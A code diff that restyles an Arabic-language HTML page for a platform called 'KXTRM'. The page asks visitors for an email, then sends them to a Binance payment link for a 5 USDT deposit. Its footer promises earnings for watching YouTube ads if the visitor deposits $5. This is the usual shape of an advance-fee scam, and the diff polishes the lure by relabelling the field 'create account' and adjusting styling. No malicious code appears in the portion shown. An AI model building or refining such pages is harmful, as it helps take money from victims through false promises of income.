@@ -13,14 +13,14 @@
     <style>
         body { 
             font-family: 'Cairo', sans-serif; 
-            background-color: #000000 !important; /* تحويل الخلفية العامة للأسود */
+            background-color: #000000 !important; /* الخلفية سوداء بالكامل */
             color: #ffffff; 
             text-align: center; 
             padding: 40px 20px; 
             margin: 0; 
         }
         .card { 
-            background: #000000 !important; /* تحويل خلفية الكرت للأسود */
+            background: #000000 !important; /* الكرت بلون أسود متناسق */
             padding: 35px 25px; 
             border-radius: 20px; 
             display: inline-block; 
@@ -56,13 +56,16 @@
             margin-bottom: 20px; 
             text-align: right; 
         }
+        
+        /* تنسيق النص الجديد (إنشاء حساب) ليكون عريضاً وواضحاً */
         label { 
             display: block; 
-            margin-bottom: 8px; 
-            color: #b2bec3; 
-            font-size: 14px; 
-            font-weight: 600;
+            margin-bottom: 10px; 
+            color: #ffffff; 
+            font-size: 16px; 
+            font-weight: 700; 
         }
+        
         input[type="text"] { 
             font-family: 'Cairo', sans-serif;
             width: 100%; 
@@ -167,7 +170,7 @@
             border-color: #6c5ce7;
         }
 
-        /* تنسيق قسم النصوص السفلية الاحترافي المكتشف من صورك */
+        /* تنسيق قسم النصوص السفلية من لقطة الشاشة */
         .footer-info-box {
             margin-top: 30px;
             font-family: sans-serif;
@@ -182,7 +185,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            gap: 8px;
         }
         .footer-info-box .highlight-red {
             color: #ff3838;
@@ -198,29 +201,29 @@
         <div class="amount-tag">الإيداع: 5.00 USDT</div>
 
         <form id="paymentForm">
-            <!-- الصفحة الأولى: إدخال البريد الإلكتروني -->
+            <!-- الصفحة الأولى -->
             <div id="step1">
                 <div class="input-group">
-                    <label for="username">البريد الإلكتروني</label>
+                    <!-- التعديل هنا: تم تغيير النص إلى إنشاء حساب -->
+                    <label for="username">إنشاء حساب</label>
                     <input type="text" id="username" required placeholder="example@gmail.com" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
                 
                 <button type="button" onclick="goToStep2()" class="submit-btn-pulse">متابعة إلى الإيداع</button>
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
-                <!-- قسم النصوص والشعارات السفلية الظاهرة في صورتك الثانية وضمان عدم اختفائها -->
+                <!-- قسم النصوص والشعارات السفلية المحدث طبقاً للصورة -->
                 <div class="footer-info-box">
                     <div class="brand-line">
-                        <span>🟢 KXTRM 🌐</span>
+                        <span>🌐 KXTRM 🟢</span>
                     </div>
                     <p>A PLATFORM TO PROVIDE COMPREHENSIVE SUPPORT<br>WHEN WATCHING YOUTUBE ADS</p>
                     <p>YOU WILL RECEIVE THE MONEY THROUGH YOUR ACCOUNT</p>
                     <p class="highlight-red">PLEASE DEPOSIT $5. GO TO PAGE.</p>
-                    <p>WITHDRAWAL METHODS ARE AVAILABLE FOR ALL WALLETS.<br>MAKING MONEY ONLINE HAS BECOME VERY EASY</p>
                 </div>
             </div>
 
-            <!-- الصفحة الثانية: خيارات الإيداع والنسخ -->
+            <!-- الصفحة الثانية -->
             <div id="step2" style="display: none; margin-top: 15px;">
                 <a href="https://binance.com" class="binance-btn-final">
                     ⚡ الدفع عبر بايننس طلب دفع
@@ -235,7 +238,7 @@
         </form>
     </div>
 
-    <!-- كود جافا سكريبت الكامل لتشغيل الأزرار والنسخ والانتقال السلس بين الصفحتين دون أي مشاكل -->
+    <!-- جافا سكريبت للتحكم بالخطوات وعملية النسخ بشكل كامل -->
     <script>
         function goToStep2() {
             var emailInput = document.getElementById('username');
